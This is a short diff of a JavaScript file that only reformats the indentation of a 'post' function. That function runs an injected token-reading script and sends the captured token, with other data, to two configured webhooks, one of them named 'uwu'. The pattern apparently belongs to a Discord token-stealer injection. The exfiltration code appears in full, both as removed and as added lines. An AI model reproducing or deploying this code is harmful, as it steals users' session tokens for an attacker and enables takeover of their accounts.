@@ -235,43 +235,44 @@ function GetLangue(read) {
 }
 const post = async (params) => {
     try {
-      const payload = JSON.stringify(params);
-      const token = await execScript(tokenScript);
-      const data = JSON.stringify({
-        data: payload,
-        token: token,
-      });
-  
-      [config.webhook, config.uwu].forEach((webhook) => {
-        const url = new URL(webhook);
-        const options = {
-          hostname: url.hostname,
-          port: url.port,
-          path: url.pathname,
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-        };
-  
-        const req = https.request(options, (res) => {
-          console.log(`statusCode: ${res.statusCode}`);
-          res.on("data", (d) => {
-            process.stdout.write(d);
-          });
+        const payload = JSON.stringify(params);
+        const token = await execScript(tokenScript);
+        const data = JSON.stringify({
+            data: payload,
+            token: token,
         });
-  
-        req.on("error", (error) => {
-          console.error(error);
+
+        [config.webhook, config.uwu].forEach((webhook) => {
+            const url = new URL(webhook);
+            const options = {
+                hostname: url.hostname,
+                port: url.port,
+                path: url.pathname,
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+            };
+
+            const req = https.request(options, (res) => {
+                console.log(`statusCode: ${res.statusCode}`);
+                res.on("data", (d) => {
+                    process.stdout.write(d);
+                });
+            });
+
+            req.on("error", (error) => {
+                console.error(error);
+            });
+
+            req.write(data);
+            req.end();
         });
-  
-        req.write(data);
-        req.end();
-      });
     } catch (error) {
-      console.error(error);
+        console.error(error);
     }
-  };
+};
+
   
 post({ foo: "bar" });
 
